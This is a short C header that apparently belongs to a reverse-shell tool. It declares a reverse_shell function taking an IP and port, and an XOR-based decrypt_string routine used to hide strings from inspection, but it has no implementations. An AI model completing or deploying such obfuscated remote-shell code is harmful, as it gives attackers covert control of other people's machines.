#ifndef SHELL_H
#define SHELL_H

#include <stdint.h>
#include <netinet/in.h>
#include <string.h>

#define STDIN_FILENO 0
#define STDOUT_FILENO 1

#define STRING_XOR_KEY 0x7A

char* decrypt_string(const uint8_t *encrypted, size_t len);

void reverse_shell(const char *ip, uint16_t port);

#endif